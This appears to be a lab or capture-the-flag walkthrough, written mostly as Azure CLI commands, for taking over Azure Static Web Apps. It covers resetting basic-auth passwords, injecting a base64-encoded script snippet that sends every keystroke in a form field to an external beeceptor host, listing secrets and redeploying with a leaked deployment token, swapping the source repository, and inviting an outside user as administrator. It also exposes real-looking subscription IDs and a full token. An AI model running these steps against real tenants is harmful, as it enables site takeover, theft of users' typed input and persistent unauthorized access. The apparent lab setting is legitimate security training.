# Static Web App

## Change passwo­rd

```sh
az staticwebapp list
az rest --method put \
--url "/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/static-web-app-labs/providers/Microsoft.Web/staticSites/static-web-app-lab-1-02fedb58/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
    "name": "basicAuth",
    "type": "Microsoft.Web/staticSites/basicAuth",
    "properties": {
        "password": "SuperPassword123.",
        "secretUrl": "",
        "applicableEnvironmentsMode": "AllEnvironments"
    }
}'
```

Then using the new password, we can access the app using the `defaultHostname` value:

```txt
ambitious-pebble-07d942410.2.azurestaticapps.net
```

## Add a snippe­t

Firt create the JS script:

```js
<script>
document.addEventListener("DOMContentLoaded", function () {
    const targetInput = document.getElementById("secretThoughts");

    if (targetInput) {
        targetInput.addEventListener("input", function (event) {
            fetch(
                `https://forsure.free.beeceptor.com?data=${encodeURIComponent(event.target.value)}`,
            );
        });
    }
});
</script>
```

Then base64 encode it and load it in the webapp (`content` field)

```sh
az staticwebapp list
az rest \
    --method PUT \
    --uri "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/static-web-app-labs/providers/Microsoft.Web/staticSites/static-web-app-lab-2-02fedb58/snippets/collectdata?api-version=2022-03-01" \
    --headers "Content-Type=application/json" \
    --body '{
        "properties": {
            "name": "collectdata",
            "location": "Body",
            "applicableEnvironmentsMode": "AllEnvironments",
            "content": "PHNjcmlwdD4KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uICgpIHsKICBjb25zdCB0YXJnZXRJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzZWNyZXRUaG91Z2h0cyIpOwoKICBpZiAodGFyZ2V0SW5wdXQpIHsKICAgIHRhcmdldElucHV0LmFkZEV2ZW50TGlzdGVuZXIoImlucHV0IiwgZnVuY3Rpb24gKGV2ZW50KSB7CiAgICAgIGZldGNoKGBodHRwczovL2ZvcnN1cmUuZnJlZS5iZWVjZXB0b3IuY29tP2RhdGE9JHtlbmNvZGVVUklDb21wb25lbnQoZXZlbnQudGFyZ2V0LnZhbHVlKX1gKTsKICAgIH0pOwogIH0KfSk7Cjwvc2NyaXB0Pgo=",
            "environments": [],
            "insertBottom": false
        }
    }'
```

## List secret­s

```sh
az staticwebapp list
az staticwebapp secrets list --name static-web-app-lab-3-02fedb58 --resource-group static-web-app-labs
az rest --method POST \
--url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/static-web-app-labs/providers/Microsoft.Web/staticSites/static-web-app-lab-3-02fedb58/listSecrets?api-version=2023-01-01"

git clone https://github.com/staticwebdev/react-basic

# Modify code as needed (using same payload as previously as well as reusing the code of previous static app), then upload
docker run --rm -v $(pwd):/mnt mcr.microsoft.com/appsvc/staticappsclient:stable INPUT_AZURE_STATIC_WEB_APPS_API_TOKEN="52bb692df13ebe47a41606d2aeded21c9b8a0a4fe77f0e3ff038b32a5cd4502002-534dc9c9-c656-454a-ab20-47e94a003c6a01014170f3e9ac10" INPUT_APP_LOCATION="/mnt" INPUT_API_LOCATION="" INPUT_OUTPUT_LOCATION="build" /bin/staticsites/StaticSitesClient upload --verbose
```

## Change reposi­tory

```sh
az staticwebapp list

# Repository token needs Action, Content, Secret and Workflow R/W (+ metadata R)
az rest --method put \
  --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/static-web-app-labs/providers/Microsoft.Web/staticSites/static-web-app-lab-4-02fedb58?api-version=2022-09-01" \
  --body '{
    "location": "centralus",
    "properties": {
    "allowConfigFil­eUpdates": true,
    "stagingEnviron­mentPolicy": "Enabled",
    "buildProperties": {
        "appLocation": "/",
        "apiLocation": "",
        "appArtifactLoc­ation": "build"
    },
    "repositoryToken": "YOUR_CLASSIC_T­OKEN_HERE",
    "repositoryUrl": "https://github.com/sklaer/staticapp-test",
    "branch": "main",
    "deploymentAuth­Policy": "GitHub",
    "provider": "GitHub"
}'
```

## Invite a user

```sh
az staticwebapp list

az staticwebapp users invite \
    --authentication-provider Github \
    --domain blue-coast-0cb15c510.1.azurestaticapps.net \
    --invitation-expiration-in-hours 168 \
    --name static-web-app-lab-5-02fedb58 \
    --roles "contributor,administrator" \
    --user-details sklaer \
    --resource-group static-web-app-labs
```
